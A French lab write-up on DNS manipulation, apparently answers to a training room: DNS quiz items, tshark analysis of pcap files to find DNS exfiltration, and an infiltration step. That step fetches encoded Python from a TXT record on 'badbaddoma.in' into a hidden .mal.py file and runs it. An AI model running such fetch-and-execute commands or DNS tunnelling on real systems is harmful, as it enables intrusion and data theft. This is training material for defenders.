## Manipulation de DNS

Lors de ce TP nous explorerons les techniques utilisées pour exfiltrer et infiltrer les données à travers des serveurs DNS.<br/>

A quoi servent les serveurs DNS ?<br/>
Le DNS est un système de noms de domaine faisant référence à un système de nommage qui résout les noms de domaine avec des adresses IP. Les serveurs DNS sont répartis dans le monde entier et sont constamment mis à jour et synchronisés entre eux de manière systématique.
<p align="center">
  <img src="https://blog.nameshield.com/fr/wp-content/uploads/sites/3/2017/04/r%C3%A9solution-dns-2-5.jpg"/>
</p>

L'objet sera d'explorer les techniques pour exfiltrer et infiltrer les données ainsi que le Tunneling de DNS Tunneling et comment il peut être utilisé pour bypasser différents protocoles comme HTTP via DNS.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/798809211060355092/intro-2-1.png"/>
</p>

##### Installation de l'environnement de travail pour le TP :

```console
$ git clone https://github.com/kleosdc/dns-exfil-infil

$ sudo apt-get update
$ sudo apt-get install python3-pip
$ export PATH=/usr/local/bin:$PATH

$ sudo pip3 install base58
$ sudo pip3 install pyshark
```

Iodine permet de tunneler les données IPv4 via un serveur DNS. Cela peut être utile dans différentes situations où l'accès Internet est protégé par un pare-feu, mais les requêtes DNS sont autorisées.

Installer iodine :
```console
$ sudo apt-get install iodine
```

Wireshark est un analyseur de paquets libre et gratuit. 

Installer Wireshark :
```console
$ sudo apt-get install tshark
```

---

#### DNS :

Sous Windows, quelle commande utiliser pour requêter un enregistrement txt pour YouTube.com ?
```console
Réponse : nslookup type=txt youtube.com
```

Sous Linux, quelle commande utiliser pour requêter un enregistrement txt pour Facebook.com ?
```console
Réponse : dig -t txt facebook.com
```

Quel type d'adresses IP stocke le AAAA avec le nom de hôte ?
```console
Réponse : IPv6
```

Le nombre maximum de caracttères pour un enrigrement DNS est de 256. Vrai/Faux ?
```console
Réponse : Faux
```

Quel enregistrement DNS donne le nom du domaine en reverse-lookup ?
```console
Réponse : PTR
```

Quel serait le résultat d'un reverse-lookup pour l'adresse IPv4 suivante : 192.168.203.2 ?
```console
$ dig -x 192.168.203.2
```

```console
Réponse : 2.203.168.192.in-addr.arpa
```

Quelle est la taille maximale d'un nom DNS ? (en incluant les points!)
```console
Réponse : 253
```

---

#### Exfiltration DNS :

L'exfiltration DNS est une technique qui consiste à utiliser le DNS pour dérober des données.<br/>
Cette technique est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.<br/>
Cela consiste à ajouter des chaînes contenant le « butin » souhaité aux requêtes DNS UDP. La chaîne contenant le butin est alors envoyée à un serveur DNS malveillant qui enregistre ces requêtes. Pour un oeil non averti, cela pourrait ressembler à un trafic DNS normal ou ces demandes pourraient être perdues dans le mélange de nombreuses demandes DNS légitimes.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>
</p>

Se connecter à la machine cible en SHH en utilisant les crédentials :
* Utilsateur : user
* Mot de passe : P@ssword01

Parcourir les fichiers dans les dossiers :
```console
~/challenges/exfiltration
~/dns-exfil-infil/
```

Aller dans le dossier ci-dessous et lire les instructions dans le fichier TASK :
```console
$ cd ~/challenges/exfiltration/orderlist
```

Le .pcap extension de fichier est principalement associée avec Wireshark; un programme utilisé pour l'analyse de réseaux. .pcap fichiers sont des fichiers de données créés en utilisant le programme et ils contiennent les données en paquets d'un réseau. Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ils contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.

Analyser le fichier order.pcap et détecter le fichier comportant des requêtes suspectes :
```console
$ tshark -r order.pcap -T fields -e dns.qry.name > DNS_names.txt
```

Le script ~/dns-exfil-infil/packetyGrabber.py permet de decrypter les fichiers Wireshark.
```console
$ python3 ~/dns-exfil-infil/packetyGrabber.py
```

Ignorer l'exception levée à la fin du script.

Quel est le nom de la première transation ? 
```console
Réponse : Network Equip.
```

Quel est le montant de la transaction Firewall ?
```console
Réponse : 2500
```

Aller dans le dossier ci-dessous :
```console
~/challenges/exfiltration/identity
```
Parmi les fichiers `*.pcap` analyser leur contenu :
```console
tshark -r cap1.pcap -T fields -e dns.qry.name
```

Quel fichier contient des requêtes DNS douteuses ?
```console
Réponse : cap3.pcap
```

```console
python3 ~/dns-exfil-infil/packetyGrabber.py
```

Trouver le texte récupéré après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
```console
Réponse : administrator:s3cre7P@ssword
```

---

#### Infiltration DNS :

L'infiltration DNS est une autre technique d'attaque qui exploite les vulnérabilités des DNS. Cette technique passe par un code malveillant qui est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés qui permettent aux attaquants de se connecter à distance à l'infrastructure réseau, soit à l'aide de programme frauduleux.<br/>
Le but étant souvent de supprimer des fichiers ou d'exécuter du code sur les machines ciblées.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
</p>

Récupérer un enregistrement au format TXT du sous-domaine `code` du domaine `badbaddoma.in` : 
```console
$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
```

Le contenu représente du code python crypté.<br/>
Décrypter le contenu avec le script python ~/dns-exfil-infil/packetySimple.py :
```console
$ python3 ~/dns-exfil-infil/packetySimple.py
```

Exécuter le script et afficher le résultat :
```console
Réponse : 4.4.0-186-generic
```
